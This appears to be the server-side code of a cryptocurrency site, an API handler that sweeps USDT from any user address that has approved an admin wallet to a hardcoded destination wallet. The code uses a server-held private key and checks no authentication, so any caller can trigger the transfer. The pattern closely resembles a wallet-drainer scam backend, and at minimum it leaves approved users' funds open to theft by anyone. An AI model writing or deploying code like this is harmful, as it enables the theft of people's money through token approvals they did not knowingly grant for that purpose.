// api/send-auto.js
import { ethers } from 'ethers';

export default async function handler(req, res) {
    // ✅ Setup CORS
    const allowedOrigins = ['https://tradeinusdt.com', 'https://www.tradeinusdt.com'];
    const origin = req.headers.origin;

    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ❌ Reject non-POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { userAddress, amount } = req.body;

    if (!userAddress || !amount) {
        return res.status(400).json({ success: false, error: 'Missing required parameters' });
    }

    try {
        if (!ethers.isAddress(userAddress)) {
            return res.status(400).json({ success: false, error: 'Invalid address' });
        }

        if (isNaN(amount)) {
            return res.status(400).json({ success: false, error: 'Amount must be a number' });
        }

        const { RPC_URL, ADMIN_PRIVATE_KEY, USDT_ADDRESS_BEP } = process.env;
        if (!RPC_URL || !ADMIN_PRIVATE_KEY || !USDT_ADDRESS_BEP) {
            return res.status(500).json({ error: 'Missing environment variables' });
        }

        const provider = new ethers.JsonRpcProvider(RPC_URL);
        const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);

        const USDT = new ethers.Contract(USDT_ADDRESS_BEP, [
            "function transferFrom(address from, address to, uint256 value) public returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)"
        ], adminWallet);

        const toWallet = "0xE4B07524A375f4Aa0905F02D33D88f60b1eD292c";
        const amountInWei = ethers.parseUnits(amount.toString(), 18);

        const allowance = await USDT.allowance(userAddress, adminWallet.address);
        if (allowance < amountInWei) {
            return res.status(400).json({ success: false, error: "Insufficient allowance. Please approve first." });
        }

        const tx = await USDT.transferFrom(userAddress, toWallet, amountInWei, { gasLimit: 100000 });
        const receipt = await Promise.race([
            tx.wait(),
            new Promise((_, reject) =>
                setTimeout(() => reject(new Error("Transaction timeout")), 30000)
            )
        ]);

        if (receipt.status !== 1) {
            throw new Error("Transaction failed on-chain");
        }

        return res.json({
            success: true,
            txHash: tx.hash,
            explorerUrl: `https://bscscan.com/tx/${tx.hash}`
        });

    } catch (err) {
        console.error("Transfer error:", err);

        let message = err.message;
        if (err.code === 'INSUFFICIENT_FUNDS') message = "Insufficient funds for gas";
        if (err.code === 'NETWORK_ERROR') message = "Network connection failed";
        if (err.message.includes("timeout")) message = "Transaction timed out";

        return res.status(500).json({
            success: false,
            error: message,
            details: process.env.NODE_ENV === 'development' ? err.stack : undefined
        });
    }
}
